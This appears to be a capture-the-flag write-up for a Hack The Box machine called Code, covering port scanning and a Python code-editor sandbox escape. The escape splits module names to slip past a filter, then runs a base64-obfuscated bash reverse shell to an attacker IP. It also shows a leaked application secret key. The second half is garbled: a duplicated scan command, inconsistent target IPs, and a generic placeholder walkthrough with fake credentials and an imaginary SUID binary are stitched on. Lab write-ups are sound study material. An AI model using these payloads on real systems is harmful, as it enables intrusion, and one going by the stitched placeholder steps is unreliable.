---
name: Code
difficulty: easy
os: linux
platform: htb

img: https://labs.hackthebox.com/storage/avatars/e6633d6c2b1d824c3756eb21aeed7590.png
---


## Enumeration
### Nmap Scan
#### Normal Scan
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.64 -o allPorts
```
##### Results
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
```

#### Remove the open filter
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.64 -o allPortsFiltered
```
##### Results
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```
#### Get version and service information
```bash
nmap -p 22,5000 -sCV 10.10.11.62 -o targeted
```
##### Results
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5b97cc4503295bcc26517df51a27abd (RSA)
|   256 94b525549b68afbe40e11da86b850d01 (ECDSA)
|_  256 128cdc97ad8600b488e229cf69b56596 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User Exploitation

### Web 
When accessing `http://10.10.11.62` it shows up a python code editor. We can create a new file and write some Python code in it. The web application allows us to execute the code we write.

we paste the following Python code to do ls:
```python
oas = sys.modules['o'+'s']
print(oas.listdir('.'))

print(oas.listdir('/'))
print(oas.listdir('/ho'+'me')) 
#print(oas.listdir('/ro'+'ot'))
```
##### Results
```
['app.py', 'static', 'templates', '__pycache__', 'instance'] ['bin', 'lib64', 'proc', 'run', 'sbin', 'usr', 'lib32', 'home', 'var', 'srv', 'libx32', 'boot', 'tmp', 'lost+found', 'lib', 'root', 'sys', 'media', 'mnt', 'etc', 'dev', 'opt'] ['martin', 'app-production'] 
```
As we can see, we can find the home directory of the user `martin` and the `app-production` directory. We do not have access to `/root`

We dont have access to /home/martin

We can do ls on the `app-production` directory:
```python
oas = sys.modules['o'+'s']
print(oas.listdir('/ho'+'me/app-production')) ```
```
##### Results
```
['user.txt', '.local', '.sqlite_history', '.profile', '.python_history', '.cache', '.bash_logout', '.bash_history', '.bashrc', 'app'] 
```
We can see that we have a file called `user.txt` in the `app-production` directory. We can read it using the following code:
```python
wd = sys.modules['subpr'+'ocess']
output = wd.check_output(['cat', '/home/app-production/user.txt'])
print(output.decode())
```
##### Results
```
user flag value
```

## Machine Access
We can access the machine using a reverse shell. We can use the following Python code to get a reverse shell:
```python
a = sys.modules['subp' + 'rocess']
output = a.check_output('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42O' +
                         'S80NDQ0IDA+JjE= | base64 -d | bash', shell=True)
print(output.decode())
```
This code will execute a reverse shell command that connects back to our machine. Make sure to set
up a listener on your machine to catch the reverse shell:
```bash
nc -lvnp 4444
```

Once we have a reverse shell, we can get a persistent shell by using the following commands:
```bash
script /dev/null -c /bin/bash
CONTROL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```
We can access the web page source code at app.py and we find credentials for database:
```python
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
```
## Database Access
We can access the SQLite database using the `sqlite3` command-line tool. First, we need to locate the database file, which is `database.db` in the `app-production` directory.
```bash
# no exite esta ruta en la maquina
sqlite3 /home/app-production/database.db
```


## Root Exploitation
To escalate privileges to root, we can check for any misconfigurations or vulnerable services. In
this case, we will look for a SUID binary that can be exploited.
```bash
find / -perm -4000 -type f 2>/dev/null
```






## Exploitation
### SSH Access
The SSH service is running on port 22. We can try to brute-force the SSH login using a tool like `hydra` or `medusa`. However, for this walkthrough, we will assume we have the credentials.
```bash
ssh user@10.0.1.3
```
### Credentials
- Username: `user`
- Password: `password`
### User Flag
Once logged in, we can find the user flag in the home directory:
```bash
cat /home/user/user.txt
```
## Root Privilege Escalation
To escalate privileges to root, we can check for any misconfigurations or vulnerable services. In this case, we will look for a SUID binary that can be exploited.
```bash
find / -perm -4000 -type f 2>/dev/null
```
### Results
```
/usr/bin/suid_binary
```
### Exploiting the SUID Binary
We can exploit the SUID binary to gain root access. Assuming the binary is vulnerable, we can run it with root privileges:
```bash
/usr/bin/suid_binary
```
### Root Flag
After successfully exploiting the SUID binary, we can find the root flag:
```bash
cat /root/root.txt
```
## Conclusion
Congratulations! You have successfully completed the walkthrough for the example machine. You have learned how to enumerate services, exploit vulnerabilities, and retrieve both user and root flags.


